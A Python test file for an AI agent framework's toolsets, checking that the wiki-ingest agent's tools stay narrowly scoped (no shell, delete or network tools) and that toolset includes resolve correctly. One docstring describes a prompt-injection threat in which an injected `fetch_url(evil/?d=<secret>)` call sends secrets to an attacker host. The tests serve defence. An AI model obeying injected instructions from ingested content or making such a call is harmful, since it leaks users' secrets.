"""Tests for core/tools/toolsets.py — Tier δ M57 declarative composition."""

from __future__ import annotations

from pathlib import Path

import pytest

from veles.core.tools.toolsets import TOOLSETS, load_toolsets


def _write_toml(path: Path, body: str) -> None:
    path.write_text(body)


# ---------- bundled file ----------


def test_bundled_toolsets_have_canonical_keys() -> None:
    assert {"builtin", "run", "ingest"} <= set(TOOLSETS)


def test_run_toolset_inherits_from_builtin() -> None:
    """run = builtin + writers + network + advisor."""
    assert "read_file" in TOOLSETS["run"]
    assert "write_file" in TOOLSETS["run"]
    assert "wiki_search" in TOOLSETS["run"]


def test_ingest_toolset_is_content_aware() -> None:
    """M203: `veles add` needs to dedup/patch/fan-out, not dump one page.

    The ingest toolset must include the search/read tools (via `builtin`)
    so it can find an existing page by meaning, plus move/add-category/
    delegate so it can relocate raw sources and route topics to workers.
    """
    ingest = TOOLSETS["ingest"]
    # find-or-patch: needs to search existing pages by meaning + read them
    assert "wiki_search" in ingest
    assert "wiki_read_page" in ingest
    assert "wiki_list_pages" in ingest
    # create + organize
    assert "wiki_write_page" in ingest
    assert "wiki_add_category" in ingest
    # source disposition + topic fan-out
    assert "move_file" in ingest
    assert "delegate" in ingest


def test_ingest_toolset_stays_scoped() -> None:
    """M203 + M198–M201: ingest must NOT get the full run blast radius —
    no shell, no delete, no arbitrary edit/write outside the wiki tools."""
    ingest = TOOLSETS["ingest"]
    for banned in ("run_shell", "delete_file", "edit_file", "write_file"):
        assert banned not in ingest


def test_ingest_toolset_has_no_network_egress() -> None:
    """B1 (2026-07-07 audit): ingested content is untrusted (a source file may
    carry prompt-injection). The ingest agent must have NO network-egress tool,
    so an injected `fetch_url(evil/?d=<secret>)` has no channel — closing the
    M203-opened bypass of the M198 egress gate. URL sources are pre-fetched by
    the CLI (wrapped untrusted) instead."""
    ingest = TOOLSETS["ingest"]
    assert "fetch_url" not in ingest
    assert "web_search" not in ingest


# ---------- include resolution ----------


def test_includes_pull_tools_transitively(tmp_path: Path) -> None:
    _write_toml(
        tmp_path / "ts.toml",
        "\n".join(
            [
                '[a]\ntools = ["t1"]',
                '[b]\nincludes = ["a"]\ntools = ["t2"]',
                '[c]\nincludes = ["b"]\ntools = ["t3"]',
            ]
        ),
    )
    ts = load_toolsets(tmp_path / "ts.toml")
    assert ts["c"] == ("t1", "t2", "t3")


def test_duplicate_tool_names_dedup_preserves_order(tmp_path: Path) -> None:
    _write_toml(
        tmp_path / "ts.toml",
        "\n".join(
            [
                '[a]\ntools = ["t1", "t2"]',
                '[b]\nincludes = ["a"]\ntools = ["t2", "t3"]',
            ]
        ),
    )
    ts = load_toolsets(tmp_path / "ts.toml")
    assert ts["b"] == ("t1", "t2", "t3")


def test_cycle_in_includes_raises(tmp_path: Path) -> None:
    _write_toml(
        tmp_path / "ts.toml",
        "\n".join(
            [
                '[a]\nincludes = ["b"]',
                '[b]\nincludes = ["a"]',
            ]
        ),
    )
    with pytest.raises(ValueError, match="cycle"):
        load_toolsets(tmp_path / "ts.toml")


def test_unknown_include_raises(tmp_path: Path) -> None:
    _write_toml(
        tmp_path / "ts.toml",
        '[a]\nincludes = ["nope"]',
    )
    with pytest.raises(KeyError, match="nope"):
        load_toolsets(tmp_path / "ts.toml")


def test_non_list_tools_raises(tmp_path: Path) -> None:
    _write_toml(tmp_path / "ts.toml", '[a]\ntools = "not-a-list"')
    with pytest.raises(ValueError, match="must be lists"):
        load_toolsets(tmp_path / "ts.toml")


# ---------- cli/_runtime.py module aliases ----------


def test_runtime_module_aliases_match_toolsets() -> None:
    from veles.cli._runtime import _INGEST_TOOLS, _RUN_TOOLS

    assert TOOLSETS["run"] == _RUN_TOOLS
    assert TOOLSETS["ingest"] == _INGEST_TOOLS
